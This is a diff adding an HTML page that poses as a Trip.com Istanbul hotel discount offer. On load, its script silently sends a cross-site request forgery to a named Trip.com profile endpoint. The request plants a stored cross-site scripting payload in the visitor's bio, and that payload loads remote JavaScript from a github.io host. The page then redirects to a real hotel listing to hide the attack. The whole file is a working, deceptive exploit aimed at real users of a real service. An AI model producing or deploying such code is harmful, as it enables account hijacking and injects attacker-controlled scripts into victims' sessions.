@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Exclusive Istanbul Hotel Deals</title>
+    <style>
+        :root {
+            --bg: #0d1117;
+            --card: #161b22;
+            --border: #30363d;
+            --text: #c9d1d9;
+            --accent: #58a6ff;
+            --muted: #8b949e;
+        }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif;
+            background-color: var(--bg);
+            color: var(--text);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px;
+        }
+        .card {
+            max-width: 450px;
+            width: 100%;
+            background: var(--card);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            padding: 32px;
+            text-align: center;
+            box-shadow: 0 8px 24px rgba(0,0,0,0.5);
+        }
+        .spinner {
+            border: 4px solid rgba(255, 255, 255, 0.1);
+            border-left-color: var(--accent);
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        h1 { font-size: 1.5rem; margin-bottom: 12px; }
+        p { color: var(--muted); font-size: 0.95rem; margin-bottom: 24px; }
+        .status { font-family: monospace; font-size: 0.8rem; color: #7ee787; background: #010409; padding: 8px; border-radius: 6px; }
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <div class="spinner"></div>
+    <h1>Loading 90% Discount...</h1>
+    <p>Please wait while we verify your special offer for Istanbul Premium Hotels.</p>
+    <div id="status" class="status">Connecting to Trip.com Secure Server...</div>
+</div>
+
+<script>
+    // The XSS payload that will be stored in the victim's bio
+    // It creates a script tag pointing to your GitHub-hosted JS
+    const githubScript = "https://ferhadfaal.github.io/CV/trip/xss.js";
+    const xssPayload = `</script><img src=x onerror="var s=document.createElement('script');s.src='${githubScript}';document.body.appendChild(s);">`;
+
+    const targetUrl = "https://us.trip.com/restapi/soa2/18066/editUserIntroduction";
+
+    async function triggerExploit() {
+        const statusDiv = document.getElementById('status');
+        
+        const data = {
+            "content": xssPayload,
+            "head": {
+                "cver": "1.0",
+                "extension": [
+                    {"name": "locale", "value": "en-US"},
+                    {"name": "platform", "value": "Online"}
+                ]
+            }
+        };
+
+        try {
+            // Using fetch with text/plain to bypass CSRF preflight checks
+            await fetch(targetUrl, {
+                method: "POST",
+                mode: "no-cors", // Crucial for CSRF
+                headers: {
+                    "Content-Type": "text/plain"
+                },
+                body: JSON.stringify(data)
+            });
+
+            statusDiv.textContent = "Offer successfully applied! Redirecting...";
+            
+            // Redirect to a real page after 2 seconds to hide the attack
+            setTimeout(() => {
+                window.location.href = "https://us.trip.com/hotels/istanbul/list";
+            }, 2500);
+
+        } catch (err) {
+            statusDiv.textContent = "Error verifying session. Please try again.";
+        }
+    }
+
+    // Launch the attack automatically on load
+    window.onload = triggerExploit;
+</script>
+
+</body>
+</html>
